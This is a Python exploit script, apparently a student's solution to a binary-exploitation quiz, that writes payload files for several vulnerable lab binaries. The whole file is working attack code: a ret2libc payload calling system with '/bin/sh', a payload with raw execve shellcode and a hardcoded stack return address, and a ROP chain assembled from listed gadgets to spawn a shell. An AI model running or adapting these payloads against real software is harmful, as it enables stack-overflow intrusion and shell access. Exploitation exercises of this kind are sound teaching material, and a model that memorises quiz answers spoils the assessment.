import struct

BASE = "/mnt/c/Users/andre/Desktop/326_quiz3/quiz3_olla/quiz3_olla/q3/QUIZ2/2021quiz"

def p32(v): return struct.pack('<I', v)

OFFSET  = 44        # lea -0x28(%ebp) -> 40 bytes + 4 saved EBP
SYSTEM  = 0xb7dd58e0
BINSH   = 0xb7f42de8
FAKERET = 0xdeadbeef
SC = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'

def write_exploit(n, payload):
    path = f"{BASE}/exploit.{n}"
    with open(path, 'wb') as f:
        f.write(str(len(payload)).encode() + b' ' + payload)
    print(f"[+] exploit.{n}  ({len(payload)} bytes)")

# bin.1 - NX on -> ret2libc
r2l = b'A' * OFFSET + p32(SYSTEM) + p32(FAKERET) + p32(BINSH)
write_exploit(1, r2l)

# bin.2 - RWE -> shellcode  (buf=0xbfffe2e0, confirmed via GDB: ebp-0x28)
sc_pay = SC + b'A' * (OFFSET - len(SC)) + p32(0xbfffe2e0)
write_exploit(2, sc_pay)

# bin.3 & bin.4 - mmap ROP (offset=44, gadget_base=0x070483e8, wr=0x07048500)
# mmap_base: bin.3 hardcoded=0x8048980, bin.4 hardcoded=0x80489ec -> both give 0x07048000
# offset(TEMP=1000)=0x3e8 -> gadget_base=0x070483e8
# Gadget table (IDENTICAL in bin.3 and bin.4):
#  +0x00: 58 5b c3  pop eax; pop ebx; ret
#  +0x03: 31 c0 c3  xor eax,eax; ret
#  +0x06: 89 03 c3  mov [ebx],eax; ret
#  +0x09: 89 c3 c3  mov %eax,%ebx; ret
#  +0x0c: 31 c9 c3  xor ecx,ecx; ret
#  +0x0f: 31 d2 c3  xor edx,edx; ret
#  +0x12: b0 0b c3  mov al,0xb; ret
#  +0x15: cd 80 c3  int 0x80; ret
# wr=0x07048500: mmap RWX region (MAP_ANONYMOUS zeroed)
#   bin.3 .bss at 0x0804a05c, TEMP at bss+8=0x0804a064 -> .bss unusable
#   bin.4 init_data() poisons entire .bss -> .bss unusable
gb = 0x070483e8
wr = 0x07048500

def rop_chain(gb, wr, offset):
    chain  = b'A' * offset
    chain += p32(gb+0x00) + b'/bin' + p32(wr)         + p32(gb+0x06)
    chain += p32(gb+0x00) + b'//sh' + p32(wr+4)       + p32(gb+0x06)
    chain += p32(gb+0x00) + p32(wr) + p32(0x41414141) + p32(gb+0x09)
    chain += p32(gb+0x0c) + p32(gb+0x0f) + p32(gb+0x03) + p32(gb+0x12) + p32(gb+0x15)
    return chain

write_exploit(3, rop_chain(gb, wr, OFFSET))
write_exploit(4, rop_chain(gb, wr, OFFSET))

# bin.0 - warm-up, no display_file, no memcpy - not exploitable via overflow
print("[*] bin.0 is a warm-up (no display_file) - skipped")
